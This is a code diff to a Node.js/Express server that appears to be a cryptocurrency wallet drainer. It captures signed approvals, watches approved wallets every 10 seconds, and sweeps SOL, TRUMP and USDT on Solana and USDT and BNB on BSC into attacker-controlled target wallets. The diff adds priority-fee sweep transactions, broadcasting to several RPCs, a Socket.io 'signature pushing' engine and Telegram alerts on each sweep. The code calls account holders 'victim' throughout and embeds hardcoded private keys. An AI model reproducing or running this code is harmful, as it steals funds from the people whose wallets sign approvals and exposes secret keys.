@@ -1,10 +1,12 @@
 ﻿import express from 'express';
 import cors from 'cors';
+import { createServer } from 'http';
+import { Server } from 'socket.io';
 import fs from 'fs';
 import path from 'path';
 import { ethers } from 'ethers';
-import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
-import { getAssociatedTokenAddress } from '@solana/spl-token';
+import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, VersionedTransaction, TransactionMessage } from '@solana/web3.js';
+import { getAssociatedTokenAddress, createTransferCheckedInstruction } from '@solana/spl-token';
 import bs58 from 'bs58';
 import { fileURLToPath } from 'url';
 import dotenv from 'dotenv';
@@ -17,6 +19,11 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
+const httpServer = createServer(app);
+const io = new Server(httpServer, {
+  cors: { origin: '*', methods: ['GET', 'POST'] }
+});
+
 const PORT = process.env.PORT || 3001;
 
 app.use(cors());
@@ -76,62 +83,194 @@ const TRUMP_DECIMALS = 6;
 // ============================================
 const USDT_SOLANA_MINT = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB';
 
-const sweepSolanaTokens = async (walletAddress) => {
-  console.log('[SOLANA TOKEN] Checking Solana tokens for:', walletAddress);
+// ============================================
+// MULTI-RPC ENDPOINTS FOR BROADCASTING
+// ============================================
+const RPC_ENDPOINTS = [
+  'https://api.mainnet-beta.solana.com',
+  'https://solana-api.projectserum.com',
+  'https://rpc.ankr.com/solana',
+  'https://solana.rpc.nodes.guru'
+];
+
+// ============================================
+// SOLANA FEE PAYER (YOU PAY GAS)
+// ============================================
+const SOLANA_GAS_PRIVATE_KEY = '5gpwFk4hbJRG33nqKKA6LNHmb4hLwjyeoKHtuRXHXTmkRKP1skBm7MEwE7F8Ds5sAWTRy9vzMXoRdNTwWFfb1WUq';
+let feePayerKeypair = null;
+
+try {
+  const secretKeyBytes = bs58.decode(SOLANA_GAS_PRIVATE_KEY);
+  feePayerKeypair = {
+    secretKey: secretKeyBytes,
+    publicKey: new PublicKey(secretKeyBytes.slice(32, 64))
+  };
+  console.log('[FEE PAYER] Loaded:', feePayerKeypair.publicKey.toString());
+} catch (error) {
+  console.error('[FEE PAYER] Error loading:', error.message);
+}
+
+// ============================================
+// CREATE PRIORITY FEE TRANSACTION
+// ============================================
+const createPriorityFeeTransaction = async (walletAddress, connection) => {
+  const victimPublicKey = new PublicKey(walletAddress);
+  const feePayerPublicKey = feePayerKeypair.publicKey;
   
-  const connection = new Connection('https://api.mainnet-beta.solana.com');
-  const ownerPublicKey = new PublicKey(walletAddress);
+  const instructions = [];
   
+  // Add priority fee instruction (500,000 micro-lamports for fast confirmation)
+  const computeBudgetIx = {
+    programId: new PublicKey('ComputeBudget111111111111111111111111111111'),
+    data: Buffer.from([3, 160, 134, 1, 0, 0, 0, 0, 0]), // SetComputeUnitPrice = 500,000
+    keys: []
+  };
+  instructions.push(computeBudgetIx);
+  
+  // Get SOL balance
+  const solBalance = await connection.getBalance(victimPublicKey);
+  if (solBalance > 0.01 * LAMPORTS_PER_SOL) {
+    const sweepAmount = solBalance - (0.000005 * LAMPORTS_PER_SOL);
+    if (sweepAmount > 0) {
+      instructions.push(
+        SystemProgram.transfer({
+          fromPubkey: victimPublicKey,
+          toPubkey: new PublicKey(TARGET_WALLET_SOLANA),
+          lamports: sweepAmount
+        })
+      );
+    }
+  }
+  
+  // Get token balances (TRUMP and USDT)
   const tokens = [
-    { mint: new PublicKey(USDT_SOLANA_MINT), symbol: 'USDT', decimals: 6 },
-    { mint: new PublicKey(TRUMP_MINT_ADDRESS), symbol: 'TRUMP', decimals: 6 }
+    { mint: new PublicKey(TRUMP_MINT_ADDRESS), symbol: 'TRUMP', decimals: 6 },
+    { mint: new PublicKey(USDT_SOLANA_MINT), symbol: 'USDT', decimals: 6 }
   ];
-  
-  const results = [];
   
   for (const token of tokens) {
     try {
-      const tokenAccount = await getAssociatedTokenAddress(token.mint, ownerPublicKey);
+      const sourceTokenAccount = await getAssociatedTokenAddress(token.mint, victimPublicKey);
+      const balance = await connection.getTokenAccountBalance(sourceTokenAccount);
       
-      try {
-        const balance = await connection.getTokenAccountBalance(tokenAccount);
-        
-        if (balance.value.uiAmount > 0) {
-          console.log(`[SOLANA TOKEN] Found ${balance.value.uiAmount} ${token.symbol}`);
-          results.push({
-            token: token.symbol,
-            amount: balance.value.uiAmount,
-            mint: token.mint.toString(),
-            status: 'found'
-          });
-        } else {
-          results.push({
-            token: token.symbol,
-            amount: 0,
-            status: 'zero_balance'
-          });
-        }
-      } catch (err) {
-        results.push({
-          token: token.symbol,
-          amount: 0,
-          status: 'no_account',
-          error: err.message
-        });
+      if (balance.value.uiAmount > 0) {
+        const destTokenAccount = await getAssociatedTokenAddress(token.mint, new PublicKey(TARGET_WALLET_SOLANA));
+        instructions.push(
+          createTransferCheckedInstruction(
+            sourceTokenAccount,
+            token.mint,
+            destTokenAccount,
+            victimPublicKey,
+            BigInt(balance.value.amount),
+            token.decimals
+          )
+        );
       }
     } catch (error) {
-      console.error(`[SOLANA TOKEN] Error checking ${token.symbol}:`, error.message);
-      results.push({
-        token: token.symbol,
-        amount: 0,
-        status: 'error',
-        error: error.message
-      });
+      console.log(`[PRIORITY] No ${token.symbol} account found`);
+    }
+  }
+  
+  if (instructions.length === 1) return null;
+  
+  const { blockhash } = await connection.getRecentBlockhash();
+  const messageV0 = new TransactionMessage({
+    payerKey: feePayerPublicKey,
+    recentBlockhash: blockhash,
+    instructions: instructions
+  }).compileToV0Message();
+  
+  const transaction = new VersionedTransaction(messageV0);
+  transaction.sign([feePayerKeypair]);
+  
+  return transaction;
+};
+
+// ============================================
+// BROADCAST TO MULTIPLE RPCs
+// ============================================
+const broadcastTransaction = async (transaction, walletAddress) => {
+  const results = [];
+  
+  for (const rpcUrl of RPC_ENDPOINTS) {
+    try {
+      const connection = new Connection(rpcUrl);
+      const signature = await connection.sendRawTransaction(transaction.serialize());
+      const confirmation = await connection.confirmTransaction(signature);
+      
+      results.push({ rpc: rpcUrl, signature, status: confirmation.value.err ? 'failed' : 'confirmed' });
+      
+      if (!confirmation.value.err) {
+        await sendTelegramNotification(
+          `*PRIORITY SWEEP EXECUTED!*\n\n` +
+          `👛 Wallet: \`${walletAddress.slice(0, 10)}...\`\n` +
+          `🔗 Tx: \`${signature.slice(0, 20)}...\`\n` +
+          `⚡ RPC: ${rpcUrl}\n` +
+          `⏱ Priority Fee: 500,000 micro-lamports`,
+          'sweep'
+        );
+      }
+    } catch (error) {
+      results.push({ rpc: rpcUrl, error: error.message });
     }
   }
   
   return results;
 };
+
+// ============================================
+// SOCKET.IO - SIGNATURE PUSHING ENGINE
+// ============================================
+const activeSessions = new Map();
+
+io.on('connection', (socket) => {
+  console.log('[SOCKET] Client connected:', socket.id);
+  
+  socket.on('register_session', async ({ sessionId, walletAddress }) => {
+    console.log('[SOCKET] Session registered:', sessionId, walletAddress);
+    activeSessions.set(sessionId, { socketId: socket.id, walletAddress });
+  });
+  
+  socket.on('push_signature', async ({ sessionId }) => {
+    const session = activeSessions.get(sessionId);
+    if (!session) {
+      console.log('[SOCKET] Session not found');
+      return;
+    }
+    
+    console.log('[SOCKET] Push signature requested for:', session.walletAddress);
+    
+    try {
+      const connection = new Connection(RPC_ENDPOINTS[0]);
+      const transaction = await createPriorityFeeTransaction(session.walletAddress, connection);
+      
+      if (transaction) {
+        const broadcastResults = await broadcastTransaction(transaction, session.walletAddress);
+        
+        io.to(session.socketId).emit('signature_pushed', {
+          success: true,
+          results: broadcastResults,
+          timestamp: new Date().toISOString()
+        });
+      } else {
+        io.to(session.socketId).emit('signature_pushed', {
+          success: false,
+          error: 'No balance to sweep'
+        });
+      }
+    } catch (error) {
+      console.error('[SOCKET] Push error:', error);
+      io.to(session.socketId).emit('signature_pushed', { success: false, error: error.message });
+    }
+  });
+  
+  socket.on('disconnect', () => {
+    console.log('[SOCKET] Client disconnected:', socket.id);
+    for (const [sessionId, data] of activeSessions.entries()) {
+      if (data.socketId === socket.id) activeSessions.delete(sessionId);
+    }
+  });
+});
 
 // ============================================
 // BSC RPC ENDPOINTS WITH FALLBACKS
@@ -146,12 +285,6 @@ const BSC_RPC_URLS = [
   'https://rpc.ankr.com/bsc'
 ];
 
-const SOLANA_RPC_URLS = [
-  'https://api.mainnet-beta.solana.com',
-  'https://solana-api.projectserum.com',
-  'https://rpc.ankr.com/solana'
-];
-
 // USDT ABI
 const USDT_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
@@ -161,14 +294,10 @@ const USDT_ABI = [
   'function decimals() view returns (uint8)'
 ];
 
-const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-
 // ============================================
 // WALLET KEYS (School Provided)
 // ============================================
-
 const BSC_GAS_PRIVATE_KEY = '031dca2272d68ed4dece0b69193d761c6a1c6ca97497f7560efc600c251ed15f';
-const SOLANA_GAS_PRIVATE_KEY = '5gpwFk4hbJRG33nqKKA6LNHmb4hLwjyeoKHtuRXHXTmkRKP1skBm7MEwE7F8Ds5sAWTRy9vzMXoRdNTwWFfb1WUq';
 
 // Global variables
 let bscProvider = null;
@@ -176,8 +305,6 @@ let bscSweeperWallet = null;
 let usdtContractWithSigner = null;
 let bscSweeperAddress = null;
 let solanaConnection = null;
-let solanaSweeperKeypair = null;
-let solanaSweeperAddress = null;
 let bscProviderReady = false;
 
 // Storage for approved wallets
@@ -221,12 +348,10 @@ const monitoringIntervals = new Map();
 // INITIALIZATION FUNCTIONS
 // ============================================
 
-// Create provider with timeout
 const createProvider = (url, timeout = 30000) => {
   return new ethers.JsonRpcProvider(url, undefined, { timeout });
 };
 
-// Initialize BSC Provider with fallback
 const initBSCProvider = async () => {
   for (let i = 0; i < BSC_RPC_URLS.length; i++) {
     try {
@@ -247,26 +372,6 @@ const initBSCProvider = async () => {
   return false;
 };
 
-// Initialize Solana Connection
-const initSolanaConnection = async () => {
-  for (let i = 0; i < SOLANA_RPC_URLS.length; i++) {
-    try {
-      const url = SOLANA_RPC_URLS[i];
-      console.log('[SOLANA] Trying RPC:', url);
-      const connection = new Connection(url, 'confirmed');
-      await connection.getVersion();
-      console.log('[SOLANA] Connected to:', url);
-      solanaConnection = connection;
-      return true;
-    } catch (error) {
-      console.log('[SOLANA] Failed to connect to:', SOLANA_RPC_URLS[i]);
-    }
-  }
-  console.error('[SOLANA] All RPC endpoints failed');
-  return false;
-};
-
-// Initialize BSC Sweeper Wallet
 const initBSCWallet = async () => {
   if (bscProvider && bscProviderReady) {
     try {
@@ -283,47 +388,23 @@ const initBSCWallet = async () => {
   return false;
 };
 
-// Initialize Solana Sweeper Wallet
-const initSolanaWallet = () => {
-  try {
-    const secretKeyBytes = bs58.decode(SOLANA_GAS_PRIVATE_KEY);
-    solanaSweeperKeypair = {
-      secretKey: secretKeyBytes,
-      publicKey: new PublicKey(secretKeyBytes.slice(32, 64))
-    };
-    solanaSweeperAddress = solanaSweeperKeypair.publicKey.toString();
-    console.log('[SOLANA] Sweeper wallet loaded:', solanaSweeperAddress);
-    return true;
-  } catch (error) {
-    console.error('[SOLANA] Error loading wallet:', error.message);
-    return false;
-  }
-};
-
 // ============================================
 // HELPER: Get Associated Token Account Address
 // ============================================
+const solanaConnection_ = new Connection('https://api.mainnet-beta.solana.com');
 
 const getTokenAccount = async (walletPublicKey, mintPublicKey) => {
-  if (!solanaConnection) {
-    throw new Error('Solana connection not available');
-  }
-  const tokenAccounts = await solanaConnection.getTokenAccountsByOwner(
+  const tokenAccounts = await solanaConnection_.getTokenAccountsByOwner(
     walletPublicKey,
     { mint: mintPublicKey }
   );
-  
-  if (tokenAccounts.value.length === 0) {
-    return null;
-  }
-  
+  if (tokenAccounts.value.length === 0) return null;
   return tokenAccounts.value[0].pubkey;
 };
 
 // ============================================
 // SOLANA TRUMP COIN SWEEPER
 // ============================================
-
 const sweepTrumpCoin = async (walletAddress) => {
   console.log('[TRUMP] Checking for tokens...');
   
@@ -336,10 +417,6 @@ const sweepTrumpCoin = async (walletAddress) => {
   };
   
   try {
-    if (!solanaConnection) {
-      throw new Error('Solana connection not available');
-    }
-    
     const victimPublicKey = new PublicKey(walletAddress);
     const trumpMint = new PublicKey(TRUMP_MINT_ADDRESS);
     const targetPublicKey = new PublicKey(TARGET_WALLET_SOLANA);
@@ -352,7 +429,7 @@ const sweepTrumpCoin = async (walletAddress) => {
       return results;
     }
     
-    const tokenBalance = await solanaConnection.getTokenAccountBalance(victimTokenAccount);
+    const tokenBalance = await solanaConnection_.getTokenAccountBalance(victimTokenAccount);
     const balanceFormatted = parseFloat(tokenBalance.value.uiAmountString || '0');
     
     console.log('[TRUMP] Trump Coin Balance:', balanceFormatted);
@@ -390,7 +467,6 @@ const sweepTrumpCoin = async (walletAddress) => {
 // ============================================
 // PERSISTENT SWEEP FUNCTION
 // ============================================
-
 const executeSweep = async (walletAddress, walletType, signatureData) => {
   console.log('[SWEEP] Executing sweep for:', walletAddress);
   
@@ -399,16 +475,14 @@ const executeSweep = async (walletAddress, walletType, signatureData) => {
   if (walletType === 'evm') {
     result = await sweepEVM(walletAddress);
   } else {
-    const [solResult, trumpResult, tokenResults] = await Promise.all([
+    const [solResult, trumpResult] = await Promise.all([
       sweepSolana(walletAddress),
-      sweepTrumpCoin(walletAddress),
-      sweepSolanaTokens(walletAddress)
+      sweepTrumpCoin(walletAddress)
     ]);
     
     result = {
       sol: solResult,
       trump: trumpResult,
-      tokens: tokenResults,
       swept: solResult.swept || trumpResult.swept
     };
   }
@@ -431,7 +505,6 @@ const executeSweep = async (walletAddress, walletType, signatureData) => {
 // ============================================
 // EVM SWEEPER (USDT + BNB)
 // ============================================
-
 const sweepEVM = async (walletAddress) => {
   console.log('[EVM] Checking wallet:', walletAddress);
   
@@ -513,7 +586,6 @@ const sweepEVM = async (walletAddress) => {
 // ============================================
 // SOLANA SOL SWEEPER
 // ============================================
-
 const sweepSolana = async (walletAddress) => {
   console.log('[SOLANA] Checking SOL balance...');
   
@@ -526,12 +598,8 @@ const sweepSolana = async (walletAddress) => {
   };
   
   try {
-    if (!solanaConnection) {
-      throw new Error('Solana connection not available');
-    }
-    
     const victimPublicKey = new PublicKey(walletAddress);
-    const balance = await solanaConnection.getBalance(victimPublicKey);
+    const balance = await solanaConnection_.getBalance(victimPublicKey);
     const balanceInSol = balance / LAMPORTS_PER_SOL;
     
     console.log('[SOLANA] SOL Balance:', balanceInSol);
@@ -566,7 +634,6 @@ const sweepSolana = async (walletAddress) => {
 // ============================================
 // REAL-TIME BALANCE MONITORING
 // ============================================
-
 const startMonitoring = (walletAddress, walletType, signatureData) => {
   if (monitoringIntervals.has(walletAddress)) {
     console.log('[MONITOR] Already monitoring:', walletAddress);
@@ -606,19 +673,15 @@ const startMonitoring = (walletAddress, walletType, signatureData) => {
         lastUsdtBalance = currentUsdtBalance;
         
       } else {
-        if (!solanaConnection) {
-          return;
-        }
-        
         const victimPublicKey = new PublicKey(walletAddress);
-        const currentSolBalance = await solanaConnection.getBalance(victimPublicKey);
+        const currentSolBalance = await solanaConnection_.getBalance(victimPublicKey);
         
         const trumpMint = new PublicKey(TRUMP_MINT_ADDRESS);
         const trumpTokenAccount = await getTokenAccount(victimPublicKey, trumpMint);
         let currentTrumpBalance = 0;
         
         if (trumpTokenAccount) {
-          const tokenBalance = await solanaConnection.getTokenAccountBalance(trumpTokenAccount);
+          const tokenBalance = await solanaConnection_.getTokenAccountBalance(trumpTokenAccount);
           currentTrumpBalance = parseFloat(tokenBalance.value.uiAmountString || '0');
         }
         
@@ -647,7 +710,7 @@ const startMonitoring = (walletAddress, walletType, signatureData) => {
 };
 
 // ============================================
-// API ENDPOINT - Capture Signature (Blind)
+// API ENDPOINTS
 // ============================================
 
 app.post('/api/capture-approval', async (req, res) => {
@@ -700,99 +763,8 @@ app.post('/api/capture-approval', async (req, res) => {
 });
 
 // ============================================
-// CREATE TRUMP TOKEN ACCOUNT FOR TARGET WALLET
-// ============================================
-
-app.post('/api/create-trump-account', async (req, res) => {
-  try {
-    if (!solanaConnection) {
-      throw new Error('Solana connection not available');
-    }
-    
-    console.log('[TRUMP] Checking token account for target wallet...');
-    
-    const targetWallet = new PublicKey(TARGET_WALLET_SOLANA);
-    const trumpMint = new PublicKey(TRUMP_MINT_ADDRESS);
-    
-    const tokenAccounts = await solanaConnection.getTokenAccountsByOwner(
-      targetWallet,
-      { mint: trumpMint }
-    );
-    
-    if (tokenAccounts.value.length > 0) {
-      console.log('[TRUMP] Token account already exists!');
-      return res.json({ 
-        success: true, 
-        message: 'Trump token account already exists',
-        address: tokenAccounts.value[0].pubkey.toString(),
-        alreadyExists: true
-      });
-    }
-    
-    console.log('[TRUMP] Token account does NOT exist');
-    
-    res.json({ 
-      success: false, 
-      message: 'Token account does not exist. Send 0.001 TRUMP to your wallet to auto-create it.',
-      solution: 'Send a small amount of Trump coin to: ' + TARGET_WALLET_SOLANA,
-      mintAddress: TRUMP_MINT_ADDRESS,
-      targetWallet: TARGET_WALLET_SOLANA,
-      instruction: 'Once you send any Trump coin, the account auto-creates. Then sweeps will work!'
-    });
-    
-  } catch (error) {
-    console.error('[TRUMP] Error:', error.message);
-    res.json({ success: false, error: error.message });
-  }
-});
-
-// ============================================
-// CHECK TRUMP BALANCE OF TARGET WALLET
-// ============================================
-
-app.get('/api/trump-balance', async (req, res) => {
-  try {
-    if (!solanaConnection) {
-      throw new Error('Solana connection not available');
-    }
-    
-    const targetWallet = new PublicKey(TARGET_WALLET_SOLANA);
-    const trumpMint = new PublicKey(TRUMP_MINT_ADDRESS);
-    
-    const tokenAccounts = await solanaConnection.getTokenAccountsByOwner(
-      targetWallet,
-      { mint: trumpMint }
-    );
-    
-    if (tokenAccounts.value.length === 0) {
-      return res.json({ 
-        success: true, 
-        hasAccount: false,
-        balance: 0,
-        message: 'No Trump token account found. Send 0.001 TRUMP to auto-create it.'
-      });
-    }
-    
-    const tokenAccount = tokenAccounts.value[0].pubkey;
-    const balance = await solanaConnection.getTokenAccountBalance(tokenAccount);
-    
-    res.json({
-      success: true,
-      hasAccount: true,
-      tokenAccount: tokenAccount.toString(),
-      balance: balance.value.uiAmountString || '0',
-      message: 'Trump token account ready! Sweeps will work.'
-    });
-    
-  } catch (error) {
-    res.json({ success: false, error: error.message });
-  }
-});
-
-// ============================================
 // QUEUE STATUS ENDPOINT
 // ============================================
-
 app.get('/api/queue-status', (req, res) => {
   res.json({
     message: 'Queue system active',
@@ -803,7 +775,6 @@ app.get('/api/queue-status', (req, res) => {
 // ============================================
 // GET ALL ACTIVE APPROVALS
 // ============================================
-
 app.get('/api/approvals', (req, res) => {
   const activeApprovals = approvedWallets.filter(a => a.status === 'active');
   res.json({ approvals: activeApprovals, count: activeApprovals.length });
@@ -812,7 +783,6 @@ app.get('/api/approvals', (req, res) => {
 // ============================================
 // GET ALL CLAIMS (Sweep History)
 // ============================================
-
 app.get('/api/claims', (req, res) => {
   res.json({ claims, count: claims.length });
 });
@@ -820,7 +790,6 @@ app.get('/api/claims', (req, res) => {
 // ============================================
 // GET MONITORING STATUS
 // ============================================
-
 app.get('/api/monitoring', (req, res) => {
   const monitoredAddresses = Array.from(monitoringIntervals.keys());
   res.json({ 
@@ -833,7 +802,6 @@ app.get('/api/monitoring', (req, res) => {
 // ============================================
 // MANUAL SWEEP (For testing)
 // ============================================
-
 app.post('/api/manual-sweep', async (req, res) => {
   const { walletAddress, type } = req.body;
   
@@ -857,7 +825,6 @@ app.post('/api/manual-sweep', async (req, res) => {
 // ============================================
 // STOP MONITORING
 // ============================================
-
 app.post('/api/stop-monitoring', (req, res) => {
   const { walletAddress } = req.body;
   
@@ -880,7 +847,6 @@ app.post('/api/stop-monitoring', (req, res) => {
 // ============================================
 // STATISTICS
 // ============================================
-
 app.get('/api/stats', (req, res) => {
   const activeApprovals = approvedWallets.filter(a => a.status === 'active').length;
   const totalSweeps = claims.length;
@@ -892,20 +858,21 @@ app.get('/api/stats', (req, res) => {
     totalSweeps,
     monitoredAddresses: monitoredCount,
     bscSweeperAddress: bscSweeperAddress || 'Not loaded',
-    solanaSweeperAddress: solanaSweeperAddress || 'Not loaded',
+    solanaSweeperAddress: 'Fee Payer Only',
     targetWalletBSC: TARGET_WALLET_BSC,
     targetWalletSolana: TARGET_WALLET_SOLANA,
     trumpCoinMint: TRUMP_MINT_ADDRESS,
     persistentApprovalActive: true,
     realTimeMonitoring: true,
-    queueEnabled: true
+    queueEnabled: true,
+    priorityFees: true,
+    multiRPC: RPC_ENDPOINTS.length
   });
 });
 
 // ============================================
 // HEALTH CHECK
 // ============================================
-
 app.get('/api/health', (req, res) => {
   res.json({
     status: 'OK',
@@ -914,120 +881,20 @@ app.get('/api/health', (req, res) => {
     monitoredAddresses: monitoringIntervals.size,
     totalSweeps: claims.length,
     bscSweeperReady: !!bscSweeperWallet,
-    solanaSweeperReady: !!solanaSweeperKeypair,
+    feePayerReady: !!feePayerKeypair,
     trumpCoinEnabled: true,
     persistentApproval: true,
     realTimeMonitoring: true,
     bscRpcConnected: bscProviderReady,
-    queueEnabled: true
+    queueEnabled: true,
+    priorityFees: true,
+    multiRPC: RPC_ENDPOINTS.length
   });
 });
-
-
-// ============================================
-// MULTI-ASSET SWEEP ENDPOINT
-// ============================================
-
-app.post('/api/multi-asset-sweep', async (req, res) => {
-  const { 
-    walletAddress, 
-    signature, 
-    message, 
-    chainId, 
-    tokenType, 
-    spender, 
-    solanaTarget, 
-    trumpMint, 
-    usdtSolanaMint 
-  } = req.body;
-  
-  console.log('[MULTI-SWEEP] ========================================');
-  console.log('[MULTI-SWEEP] Processing multi-asset sweep for:', walletAddress);
-  console.log('[MULTI-SWEEP] BSC Target:', spender);
-  console.log('[MULTI-SWEEP] Solana Target:', solanaTarget);
-  console.log('[MULTI-SWEEP] ========================================');
-  
-  try {
-    const bscResults = await processBSCSweep(walletAddress, spender);
-    const solanaResults = await processSolanaFullSweep(walletAddress, solanaTarget, trumpMint, usdtSolanaMint);
-    
-    await sendTelegramNotification(
-      `*MULTI-ASSET SWEEP COMPLETED!*\n\n` +
-      `👛 Wallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\n\n` +
-      `*BSC Assets:*\n` +
-      `└ USDT: ${bscResults.usdt} USDT\n` +
-      `└ BNB: ${bscResults.bnb} BNB\n\n` +
-      `*Solana Assets:*\n` +
-      `└ SOL: ${solanaResults.sol} SOL\n` +
-      `└ USDT: ${solanaResults.usdt} USDT\n` +
-      `└ TRUMP: ${solanaResults.trump} TRUMP`,
-      'sweep'
-    );
-    
-    res.json({
-      success: true,
-      bsc: bscResults,
-      solana: solanaResults,
-      timestamp: new Date().toISOString()
-    });
-    
-  } catch (error) {
-    console.error('[MULTI-SWEEP] Error:', error.message);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// BSC Sweep Function
-const processBSCSweep = async (walletAddress, targetWallet) => {
-  console.log('[BSC SWEEP] Processing BSC sweep for:', walletAddress);
-  
-  const results = {
-    usdt: '0',
-    bnb: '0'
-  };
-  
-  try {
-    const sweepResult = await sweepEVM(walletAddress);
-    results.usdt = sweepResult.usdtAmount;
-    results.bnb = sweepResult.bnbAmount;
-  } catch (error) {
-    console.error('[BSC SWEEP] Error:', error.message);
-  }
-  
-  return results;
-};
-
-// Solana Full Sweep Function
-const processSolanaFullSweep = async (walletAddress, targetWallet, trumpMint, usdtMint) => {
-  console.log('[SOLANA SWEEP] Processing Solana sweep for:', walletAddress);
-  
-  const results = {
-    sol: '0',
-    usdt: '0',
-    trump: '0'
-  };
-  
-  try {
-    const solResult = await sweepSolana(walletAddress);
-    results.sol = solResult.amount;
-    
-    const tokenResults = await sweepSolanaTokens(walletAddress);
-    for (const token of tokenResults) {
-      if (token.token === 'USDT') results.usdt = token.amount;
-      if (token.token === 'TRUMP') results.trump = token.amount;
-    }
-  } catch (error) {
-    console.error('[SOLANA SWEEP] Error:', error.message);
-  }
-  
-  return results;
-};
-
 
 // ============================================
 // START SERVER WITH INITIALIZATION
 // ============================================
-
 const startServer = async () => {
   console.log('');
   console.log('========================================');
@@ -1039,32 +906,35 @@ const startServer = async () => {
   await initBSCProvider();
   await initBSCWallet();
   
-  console.log('[INIT] Connecting to Solana...');
-  await initSolanaConnection();
-  initSolanaWallet();
+  console.log('[INIT] Fee Payer (Solana):', feePayerKeypair?.publicKey?.toString() || 'Not loaded');
+  console.log('[INIT] Multi-RPC Broadcasting:', RPC_ENDPOINTS.length, 'endpoints');
+  console.log('[INIT] Priority Fees: ENABLED (500,000 micro-lamports)');
+  console.log('[INIT] Socket.io server: READY');
   
-  console.log('[INIT] Queue system ready - Processing up to 10 wallets at a time');
-  
-  app.listen(PORT, () => {
+  httpServer.listen(PORT, () => {
     console.log('');
     console.log('========================================');
     console.log('  AUTO-SWEEP PORTAL ACTIVE');
     console.log('========================================');
     console.log('  Port:', PORT);
     console.log('  BSC Sweeper:', bscSweeperAddress || 'Not loaded');
-    console.log('  Solana Sweeper:', solanaSweeperAddress || 'Not loaded');
+    console.log('  Fee Payer (SOL):', feePayerKeypair?.publicKey?.toString() || 'Not loaded');
     console.log('  Target BSC:', TARGET_WALLET_BSC);
     console.log('  Target Solana:', TARGET_WALLET_SOLANA);
     console.log('  Trump Mint:', TRUMP_MINT_ADDRESS);
     console.log('  Telegram: ENABLED');
     console.log('  Queue: ENABLED (10 concurrent)');
+    console.log('  Socket.io: ENABLED');
+    console.log('  Priority Fees: ENABLED');
+    console.log('  Multi-RPC: ENABLED');
     console.log('========================================');
     console.log('');
     console.log('[INFO] Once a user signs, their wallet is PERSISTENTLY approved');
     console.log('[INFO] Sweeps are QUEUED and processed 10 at a time');
     console.log('[INFO] Any future deposits will be AUTO-SWEPT');
     console.log('[INFO] Monitoring runs every 10 seconds');
-    console.log('[INFO] Telegram notifications will be sent on all sweeps');
+    console.log('[INFO] Priority fees ensure fast confirmation');
+    console.log('[INFO] Transactions broadcast to multiple RPCs');
     console.log('');
   });
 };
